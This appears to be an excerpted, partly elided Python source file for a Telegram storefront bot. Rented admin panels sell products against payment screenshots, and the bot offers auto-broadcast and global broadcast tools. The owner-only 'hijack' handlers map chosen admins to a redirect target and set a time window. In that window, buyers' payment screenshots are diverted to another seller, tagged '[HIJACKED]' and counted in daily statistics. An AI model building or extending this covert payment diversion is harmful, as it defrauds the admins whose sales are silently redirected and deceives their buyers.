...
def ensure_store(uid, role="admin", name="", username="", expires_at=None):
    ...
    if s is None:
        ...
        if username and s.get("username") != username:
            s["username"] = username
            updated = True
        if expires_at is not None and s.get("expires_at") != expires_at:
...
# ============================================================
# AUTO BROADCAST WORKER — REWRITTEN FOR FAST + RELIABLE
# ============================================================
def auto_broadcast_worker():
    """Runs continuously. For each store with auto_bc ON, broadcasts every interval."""
    last_sent = {}  # uid_str -> timestamp of last broadcast
    while True:
        try:
            acted = False
            for key, r in list(DB_STATE.get("stores", {}).items()):
                ...
                if not bc.get("status"):
                    continue
                if not bc.get("message_type") or (not bc.get("file_id") and not bc.get("text")):
                    # No content set yet
                    continue
...
def handle_callbacks(call):
    ...
    if is_owner(uid):
        ...
        # Owner admin buttons (Auto BC etc) go to _store_admin_handle
...
def _owner_handle(call):
    ...
    if data == "hijack_set_time":
        ...
        update_admin_panel(uid, "✍️ **Send time range (IST):** `00:00-02:00`",
    ...
    if data == "hijack_map_list":
        ...
        update_admin_panel(uid, "🔗 Configure admin link hijack mappings.", mk)
        return
    ...
    if data == "hijack_add_map":
        ...
        update_admin_panel(uid, "✍️ Select admin whose command/link to hijack:", mk)
        return
    ...
    if data.startswith("hijack_sel_from_"):
        ...
        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list"))
        update_admin_panel(uid, f"✅ From Admin: `{from_id}`\n\n🎯 Select redirect target:", mk)
        return
    ...
    if data == "hijack_view_stats":
        ...
        if not hs:
            txt += "No hijacked payments today yet."
        else:
            for adm_id, info in hs.items():
                ...
                txt += f"💰 **Total Payments:** {info.get('count',0)}\n"
                for p_name, p_count in info.get("products", {}).items():
                    txt += f"   • {p_name}: {p_count}\n"
                txt += "-------------------\n"
    ...
    if data == "own_admins_menu":
        ...
        update_admin_panel(uid, "✍️ **Send admin's Telegram USER ID** (e.g. `123456789`).",
        ...
        update_admin_panel(uid, f"⏱️ **Admin `{target}`**\nSend: `30`=30s, `10m`, `2h`, `1d` (to ADD),\n`-10m` (remove), `0` = revoke now.",
        ...
        lines = (f"📊 **Stats for {a.get('name','')} (`{target}`) — {today_str()}**\n\n"
                 ...
                 f"• Accepted today: {st.get('accepted',0)}\n")
        if byprod:
        ...
        update_admin_panel(uid, "💳 Send NEW payment QR photo:",
...
# ============================================================
# STORE ADMIN HANDLER — AUTO BC HANDLERS MOVED TO TOP
# ============================================================
def _store_admin_handle(call):
    ...
    # === AUTO BROADCAST (OWNER ONLY) — TOP PRIORITY ===
    if is_owner(uid) and (data == "adm_autobc_menu" or data.startswith("adm_autobc_")):
        ...
        if data == "adm_autobc_menu":
            ...
            txt_prev = bc.get("text") or ""
            prev = (txt_prev[:60] + "...") if len(txt_prev) > 60 else (txt_prev or "Not set")

            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton(
                ("🔴 Turn OFF" if bc.get("status") else "🟢 Turn ON"),
                callback_data="adm_autobc_toggle"))
        ...
        if data == "adm_autobc_set_msg":
            ...
            update_admin_panel(uid,
                ...
                "You can send text, photo with caption, video with caption, or document.\n\n"
        ...
        if data == "adm_autobc_preview":
            ...
            txt = bc.get("text") or ""
            if not m_type:
                update_admin_panel(uid, "❌ No message set yet.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
                return
            try:
                if m_type == "photo":
                    bot.send_photo(uid, f_id, caption=txt)
                elif m_type == "video":
                    bot.send_video(uid, f_id, caption=txt)
                elif m_type == "document":
                    bot.send_document(uid, f_id, caption=txt)
                else:
                    bot.send_message(uid, txt)
                update_admin_panel(uid, "👁 Preview sent above ↑", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
            except Exception as e:
                update_admin_panel(uid, f"❌ Preview error: {e}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
            return
        ...
        if data == "adm_autobc_set_time":
            ...
            update_admin_panel(uid, "⏱️ Select preset interval:", mk)
            return
        ...
        if data == "adm_autobc_custom_time":
            ...
            update_admin_panel(uid,
                "✍️ **Send timer in seconds** (e.g. 45, 120, 900):",
                InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
            return

    # === OTHER OWNER-ONLY TOP BUTTONS ===
    if is_owner(uid) and data == "adm_send_custom_bc":
        user_states[uid] = "WAITING_CUSTOM_BROADCAST"
        update_admin_panel(uid,
            "🚀 **Global Broadcast:** Send message to broadcast to ALL USERS across ALL admin stores:",
            InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))
        return

    if is_owner(uid) and data == "adm_buyers_bc_menu":
        user_states[uid] = "WAITING_BUYERS_BROADCAST"
        update_admin_panel(uid,
            "👑 Send message to YOUR buyers only:",
            InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))
        return
    ...
    if data == "adm_add_start_vid":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))
        user_states[uid] = "ADM_ADD_START_VID_MULTIPLE"
        update_admin_panel(uid, "📥 Send/forward videos one by one. Tap Done when finished:", mk)
        return
    ...
    if data.startswith("sv_del_"):
        if data == "sv_del_all":
            ...
            idx = int(data.split("_")[2])
            if 0 <= idx < len(r.get("start_videos", [])):
                r["start_videos"].pop(idx)
        save_db()
    ...
    if data == "adm_add_prod":
        mk = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu"))
    ...
    if data == "adm_prod_edit_list":
        ...
        update_admin_panel(uid, "Select button:", mk)
        return
    ...
    if data.startswith("adm_ped_cleardesc_"):
        ...
        if p:
            p["desc"] = ""
        save_db()
        call.data = f"adm_p_edit_{pid}"
        _store_admin_handle(call)
        return
    if data.startswith("adm_ped_name_"):
        pid = data.split("_")[3]
        user_states[uid] = f"EDIT_P_NAME_{pid}"
        update_admin_panel(uid, "✍️ Send new name:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}")))
        return
    if data.startswith("adm_ped_desc_"):
        pid = data.split("_")[3]
        user_states[uid] = f"EDIT_P_DESC_{pid}"
        update_admin_panel(uid, "✍️ Send new description:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}")))
        return
    if data.startswith("adm_ped_link_"):
        pid = data.split("_")[3]
        user_states[uid] = f"EDIT_P_LINK_{pid}"
        update_admin_panel(uid, "🔗 Send new link:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}")))
        return
    if data.startswith("adm_ped_paym_"):
        pid = data.split("_")[3]
        user_states[uid] = f"EDIT_P_PAYM_{pid}"
        update_admin_panel(uid, "💳 Send payment text (or `skip` for global):",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}")))
        return
    ...
    if data == "adm_prod_pos_list":
        ...
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "🔢 Click then type new position:", mk)
        return
    if data.startswith("adm_p_pos_"):
        pid = data.split("_")[3]
        user_states[uid] = f"EDIT_P_POS_{pid}"
        update_admin_panel(uid, "🔢 Type new position:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_pos_list")))
        return
    ...
    if data == "adm_prod_add_vid_list":
        ...
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Add videos to which button?", mk)
        return
    if data.startswith("adm_p_addvid_"):
        pid = data.split("_")[3]
        user_states[uid] = f"ADM_UPL_PROD_VID_MULTIPLE_{pid}"
        mk = InlineKeyboardMarkup()
        ...
        update_admin_panel(uid, "📥 Send videos. When done:", mk)
        return
    ...
    if data == "adm_prod_del_vid_list":
        ...
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Manage videos of:", mk)
        return
    ...
    if data == "adm_del_prod_list":
        ...
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Delete which button?", mk)
        return
    ...
    if data == "adm_edit_welcome":
        ...
        update_admin_panel(uid, "📝 **Send new Welcome text** (use `{name}` for user name):",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel")))
        return
    ...
    if data == "adm_pay_config_menu":
        ...
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, "💳 **Global Payment Config**", mk)
        return
    if data == "adm_set_pay_photo":
        user_states[uid] = "ADM_SET_PAY_PHOTO"
        update_admin_panel(uid, "💳 Send payment QR photo:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu")))
        return
    if data == "adm_edit_pay_msg":
        user_states[uid] = "ADM_SET_PAY_MSG_TEXT"
        update_admin_panel(uid, f"✍️ Current: `{r.get('payment_msg')}`\n\nSend new payment text:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu")))
        return
    ...
    if data == "adm_unblock_menu":
        ...
        mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, "🛡️ Unblock user:", mk)
        return
    if data.startswith("adm_unblock_exec_"):
        b = int(data.split("_")[3])
        if b in r.get("blocked_users", []):
            r["blocked_users"].remove(b)
        save_db()
    ...
    if data.startswith("adm_reject_"):
        parts = data.split("_")
        s_uid, cust = parts[2], int(parts[3])
        if str(s_uid) != str(uid):
            return
    ...
    if data.startswith("adm_block_"):
        ...
        if cust not in get_store(s_uid).get("blocked_users", []):
            get_store(s_uid)["blocked_users"].append(cust)
            save_db()
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n🚫 **Status:** User Blocked!",
                                     chat_id=uid, message_id=call.message.message_id, parse_mode="Markdown")
...
def do_single_store_broadcast(target_store, message):
    ...
    for u_id in target_store.get("users", []):
        if u_id in target_store.get("blocked_users", []):
            continue
        try:
...
def handle_all_inputs(message):
    ...
    if state.startswith("WAITING_REPORT_"):
        ...
        bot.send_message(int(dest_seller_uid),
                         f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward your answer.*",
                         parse_mode="Markdown")
        return

    if state.startswith("WAITING_SCREENSHOT_"):
        parts = state.split("_")
        orig_s_uid, pid = parts[2], parts[3]
        ...
        if message.content_type == 'photo':
            ...
            if is_hijacked and str(orig_s_uid) != str(OWNER_ID) and not can_use_panel(uid):
                ...
                caption_info += f"\n\n🌙 **[HIJACKED]** From: {adm_nm} (`{orig_s_uid}`)"
            try:
                bot.send_photo(int(dest_s_uid), message.photo[-1].file_id, caption=caption_info,
    ...
    if can_use_panel(uid):
        ...
        if state == "WAITING_AUTOBC_MSG":
            ...
            if m_type == "photo":
                ...
                update_admin_panel(uid, "❌ Unsupported type. Send text, photo, video, or document.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
                return
            ...
            r["auto_bc"]["text"] = txt
            save_db()
            print(f"✅ Auto BC msg saved: type={m_type}, len={len(txt)}, uid={uid}")
            ...
            if bc.get("status"):
                mk.row(InlineKeyboardButton("🔴 Turn OFF", callback_data="adm_autobc_toggle"))
            else:
                mk.row(InlineKeyboardButton("🟢 Turn ON Now", callback_data="adm_autobc_toggle"))
            ...
            update_admin_panel(uid,
                f"✅ **Auto Broadcast Message Saved!**\n\n"
                f"📝 Type: `{m_type}`\n"
        ...
        if state == "WAITING_HIJACK_TIME" and message.text and is_owner(uid):
            try:
                ...
                if len(parts) == 2:
                    ...
                    save_db()
                    user_states.pop(uid, None)
                    update_admin_panel(uid, f"✅ Hijack IST Schedule: `{st}` - `{et}`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu")))
                else:
                    update_admin_panel(uid, "❌ Invalid. Use `00:00-02:00`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
            except Exception:
                update_admin_panel(uid, "❌ Error. Use `00:00-02:00`",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
            return
        ...
        if state == "OWN_ADD_ADMIN_ID" and message.text and is_owner(uid):
            try:
                ...
                if get_store(nid):
                    update_admin_panel(uid, f"⚠️ ID `{nid}` already exists.",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
                else:
                    user_states[uid] = f"OWN_ADD_ADMIN_EXP_{nid}"
                    update_admin_panel(uid, f"✅ ID `{nid}` ok. Now type expiry: `30`, `10m`, `2h`, `1d`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
            except Exception:
        ...
        if state.startswith("OWN_EXP_IN_") and is_owner(uid):
            ...
            if a:
                ...
                if dur == 0:
                    ...
                    update_admin_panel(uid, "❌ Invalid format.",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_exp_list")))
                    return
                save_db()
                user_states.pop(uid, None)
                update_admin_panel(uid, f"✅ New expiry `{target}`: **{fmt_expiry(a['expires_at'])}**",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage Admins", callback_data="own_admins_menu")))
            return
        ...
        if state.startswith("OWN_C_PAYPHOTO_") and message.content_type == 'photo' and is_owner(uid):
            ...
            a = get_store(t)
            a["payment_photo"] = message.photo[-1].file_id
            save_db()
            user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Payment QR updated for `{t}`.",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_PAYMSG_") and message.content_type == 'text' and is_owner(uid):
            t = state.replace("OWN_C_PAYMSG_", "")
            a = get_store(t)
            a["payment_msg"] = message.text
            save_db()
            user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Payment text updated.",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_TIMERBC_") and is_owner(uid):
            ...
            save_db()
            user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ Timer content updated for `{t}`.",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_INSTANTBC_") and is_owner(uid):
            ...
            update_admin_panel(uid, f"✅ Done. Sent: {ok} | Failed: {fail}",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Content", callback_data=f"own_content_sel_{t}")))
            return
        ...
        if state == "ADM_ADD_START_VID_MULTIPLE" and message.content_type == 'video':
            ...
            save_db()
            mk = InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))
            update_admin_panel(uid, f"📥 Send more. Added: {len(r['start_videos'])}", mk)
            return
        if state.startswith("ADM_UPL_PROD_VID_MULTIPLE_") and message.content_type == 'video':
            ...
            if p:
                ...
                save_db()
                mk = InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{pid}"))
        ...
        if state.startswith("EDIT_P_PAYM_") and message.text:
            ...
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p:
                p["pay_msg"] = "" if message.text.strip().lower() == "skip" else message.text
                save_db()
            user_states.pop(uid, None)
            show_store_admin_menu(uid)
            return
        ...
        if state == "ADM_ADD_PROD_NAME" and message.text:
            ...
            update_admin_panel(uid, f"✅ `{message.text}` created. Now send delivery LINK:",
        ...
        if state.startswith("ADM_ADD_PROD_LINK_") and message.text:
            ...
            update_admin_panel(uid, "✅ Link saved. Send DESCRIPTION (or /skip):",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu")))
            return
        if state.startswith("ADM_ADD_PROD_DESC_") and message.text:
            ...
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p:
                p["desc"] = "" if message.text.strip() == "/skip" else message.text
                save_db()
            user_states.pop(uid, None)
            show_store_admin_menu(uid)
            return
        ...
        if is_owner(uid):
            if state == "WAITING_AUTOBC_CUSTOM_TIME" and message.text:
                ...
                try:
                    ...
                    ivt = f"{iv}s" if iv < 60 else (f"{iv//60}m" if iv < 3600 else f"{iv//3600}h")
                    update_admin_panel(uid, f"✅ Timer set: `{ivt}` ({iv}s)",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu")))
                except ValueError:
                    update_admin_panel(uid, "❌ Invalid number. Send seconds.",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Auto BC", callback_data="adm_autobc_menu")))
                return
            if state == "WAITING_CUSTOM_BROADCAST":
                user_states.pop(uid, None)
                update_admin_panel(uid, "🚀 Sending global broadcast...", None)
                ok, fail = do_global_broadcast(message)
                update_admin_panel(uid, f"✅ Global BC Done\nSent: {ok} | Failed: {fail}",
            ...
            if state == "WAITING_BUYERS_BROADCAST":
                ...
                for b in r.get("buyers", []):
                    if b.get("user_id") in seen or b.get("user_id") in r.get("blocked_users", []):
                        continue
                    ...
                    try:
                        ...
                        fail += 1
                update_admin_panel(uid, f"✅ Buyers BC Done\nSent: {ok} | Failed: {fail}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel")))
                return
        ...
        if state == "WAITING_RESTORE_CODE" and message.text:
            try:
                ...
                save_db()
                user_states.pop(uid, None)
                update_admin_panel(uid, "✅ Settings restored.",
